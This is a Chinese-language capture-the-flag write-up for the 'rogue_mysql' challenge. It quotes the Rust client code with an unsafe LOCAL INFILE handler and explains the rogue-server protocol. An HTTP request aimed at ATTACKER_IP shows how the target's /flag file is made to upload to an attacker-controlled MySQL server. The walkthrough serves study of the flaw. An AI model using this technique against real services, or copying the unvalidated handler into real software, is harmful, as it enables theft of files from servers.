# rogue_mysql

## 题目简述

题目提供一个在线 MySQL 连接测试服务。用户可以控制目标主机、端口、账号、数据库和查询语句，后端再使用 `mysql_async` 主动连接该 MySQL 服务。容器中的 flag 位于 `/flag`。

关键问题是客户端显式启用了不安全的 `LOCAL INFILE` 处理器：远端 MySQL 服务端只要发出读取某个文件的请求，题目进程就会在本机打开该路径，并把文件内容通过 MySQL 连接上传给服务端。由于连接地址也由用户控制，可以让题目连接攻击者搭建的恶意 MySQL 服务端并泄露 `/flag`。

## 解题过程

连接接口直接使用用户提交的字段构造连接参数：

```rust
let opts = OptsBuilder::default()
    .ip_or_hostname(conn_info.host)
    .tcp_port(conn_info.port)
    .user(Some(conn_info.user))
    .pass(Some(conn_info.pass))
    .db_name(Some(conn_info.db))
    .local_infile_handler(Some(UnsafeFsHandler));

let mut conn = Conn::new(opts).await?;
let v: String = conn.query_first(conn_info.query).await?.unwrap();
```

`UnsafeFsHandler` 没有检查服务端给出的文件名，而是直接在题目容器中打开对应路径：

```rust
impl GlobalHandler for UnsafeFsHandler {
    fn handle(&self, file_name: &[u8]) -> BoxFuture<'static, Result<InfileData, LocalInfileError>> {
        let path = String::from_utf8_lossy(file_name).to_string();
        async move {
            let file = File::open(path).await?;
            Ok(Box::pin(ReaderStream::new(file)) as InfileData)
        }
        .boxed()
    }
}
```

这里利用的是 MySQL `LOAD DATA LOCAL INFILE` 的协议行为。客户端发出查询后，恶意服务端不返回普通结果，而是发送以 `0xfb` 开头、后接文件名的 `LOCAL INFILE` 请求包。题目进程收到 `/flag` 后调用上述处理器读取本地文件，并把内容作为后续数据包发回恶意服务端。

可以使用开源的 [rogue_mysql_server 源码与配置说明](https://github.com/rmb122/rogue_mysql_server) 搭建服务端。使用方式有两种：

- 在 `config.yaml` 的 `file_list` 中加入 `/flag`，让服务端固定请求该文件；
- 将 `from_database_name` 设为 `true`，再让题目连接时把数据库名填写为 `/flag`，由服务端把数据库名当作待读路径。

启动恶意服务端并确保其 MySQL 监听端口可被题目容器访问，然后向题目的 `/connect` 接口提交连接信息。例如采用固定 `file_list` 时，可以发送：

```http
POST /connect HTTP/1.1
Host: TARGET
Content-Type: application/json

{
  "host": "ATTACKER_IP",
  "port": 3306,
  "user": "root",
  "pass": "x",
  "db": "test",
  "query": "SELECT 1"
}
```

此处查询内容只用于触发一次 MySQL 命令交互，真正的文件名由恶意服务端的 `LOCAL INFILE` 请求指定。文件内容会出现在攻击者服务端的接收结果中：

```text
0xGame{rogue_mysql_file_read_c651e6a60def}
```

## 方法总结

本题同时具备两个危险条件：用户可控数据库连接目标，以及客户端启用了无路径校验的 `LOCAL INFILE` 处理器。完整利用链是“诱导题目连接恶意 MySQL 服务端 → 服务端请求 `/flag` → 客户端本地打开文件 → 内容反向上传”。外部工具只是实现恶意协议交互的载体，决定漏洞成立的是源码中的 `local_infile_handler(Some(UnsafeFsHandler))`。
